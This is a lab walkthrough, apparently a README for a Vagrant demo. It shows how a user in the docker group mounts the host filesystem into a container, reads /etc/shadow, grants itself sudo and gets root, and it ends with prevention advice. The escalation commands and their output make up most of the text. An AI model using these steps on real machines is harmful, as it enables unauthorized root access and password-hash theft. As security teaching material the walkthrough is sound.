# Privilege Escalation
This demo walks you through how a non-privileged user with access to Docker can
get root access to the file system and elevate their privileges using intended
features.

## Start Here: Vagrant
(Make sure [Vagrant](https://www.vagrantup.com/) is installed)

Open a terminal and run the following command:
```sh
$ vagrant up
```
This will start up a virtual machine and install Docker Engine in it.

When the virtual machine is up, get a shell in the virtual machine as follows:
```sh
$ vagrant ssh
```

This will give you a shell for `user`.
The password for the user named "user" is `password` by default.

## Try it out
Let's attempt to access a typical target for attackers, the [shadow](https://man7.org/linux/man-pages/man5/shadow.5.html) file.

```sh
user@ubuntu-jammy:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

Well darn. How about using sudo? The password is `password`
```sh
user@ubuntu-jammy:~$ sudo cat /etc/shadow
[sudo] password for user: 
user is not in the sudoers file.  This incident will be reported.
```
Darn again! But take a look at this:
```sh
user@ubuntu-jammy:~$ groups
user docker
```
We have the docker group! Let's abuse this.

## Testing out Docker
Let's give Docker a whirl.
```sh
user@ubuntu-jammy:~$ docker --version
Docker version 20.10.21, build baeda1f
```
Looks promising. Let's run the `hello-world` image.
```sh
user@ubuntu-jammy:~$ docker run hello-world
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
2db29710123e: Pull complete 
Digest: sha256:faa03e786c97f07ef34423fccceeec2398ec8a5759259f94d99078f264e9d7af
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
```

Awesome! We have the ability to user Docker without sudo, because we are in the
`docker` linux group.

## Background on Docker
Docker by default has some security issues, such as:
- The Docker daemon runs as the user `root`. This can be abused.
- Docker has this awesome feature called "mounts". It allows you to connect
parts of the host file system to your Docker container. These respect the file
permissions on the host operating system.
- In a Docker container, the `root` user is considered to be the host `root`
user.

So let's use this knowledge for potentially nefarious purposes.

## Abusing Docker
Let's make a new Docker Container. It can be really any image as long as you
can get a root shell in the container.

We will run a new Docker container based on the [Ubuntu image](https://hub.docker.com/_/ubuntu) and attach it to our terminal, and mount the whole host filesystem to the folder `/mnt` on the container
```sh
user@ubuntu-jammy:~$ docker run -i --mount type=bind,source=/,target=/mnt ubuntu
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
e96e057aae67: Pull complete 
Digest: sha256:4b1d0c4a2d2aaf63b37111f34eb9fa89fa1bf53dd6e4ca954d47caebca4005c2
Status: Downloaded newer image for ubuntu:latest

```
And we now have a shell inside the Ubuntu container, though it may not look like it. Type `whoami` in the terminal.
```sh
whoami
root
```
Lovely.
## This used to be protected
Remember how we mounted the filesystem to the folder `/mnt`? Let's take a look
```
chroot /mnt
```
This makes it look like we are in the actual host operating system.

Now, let's see if we can see that shadow file we wanted earlier.
```
# cat /etc/shadow
root:*:19320:0:99999:7:::
daemon:*:19320:0:99999:7:::
bin:*:19320:0:99999:7:::
sys:*:19320:0:99999:7:::
  <-- trim -->
vagrant:$y$j9T$2AlJfhokmGY4.iL/XQha..$1QPVY3E3QbaAhiQZFqjxKtTOHpIhF91xnJO83s8d252:19320:0:99999:7:::
ubuntu:!:19326:0:99999:7:::
lxd:!:19326::::::
user:$y$j9T$ZkAsh0tesBHBGkO3BGRmW1$d/E4cTqN.7HujxUmeO2oWvfis2wA3jpwPyvV8PKUwP4:19327:0:99999:7:::
```
(output trimmed for brevity)

We aren't supposed to see this! Remember, just before we got an "Access Denied",
but now we have root privileges.

## And escape.
Let's give ourselves sudo privileges, too. Add the group "sudo" to the user
"user".
```
# sudo usermod -a -G sudo user         
sudo: unable to resolve host 59c4f2066b5f: Temporary failure in name resolution
```
At first it seems to have failed, but let's log out.

Type `exit` three times to exit the chroot, then the container, then log out
from the virtual machine. Then, run `vagrant ssh` on your host machine again.

Once in, run the command `groups` to see your groups
```sh
user@ubuntu-jammy:~$ groups
user sudo docker
```
Amazing! Let's try it out. Remember the password for `user` is `password`
```
user@ubuntu-jammy:~$ sudo su -
[sudo] password for user:
root@ubuntu-jammy:~#
```
I believe we have sufficiently conquered the host.

## Cleaning up
Delete the virtual machine using the following command on your host system:
```sh
vagrant destroy
```

# Aftermath
So we have, with an unprivileged user:
- Created a Docker container with a mount
- Viewed files we were not supposed to
- Gave ourselves sudo access
- Got a root shell

With just the `docker` group for our user.

## Prevention
So this is obviously terrible for whoever owns the machine. But, it is fairly
easy to protect against.
- Only give trusted users the `docker` group.
- Restrict Docker usage to root only (and access via `sudo`)
- Use [User-Namespace remapping](https://docs.docker.com/engine/security/userns-remap/)
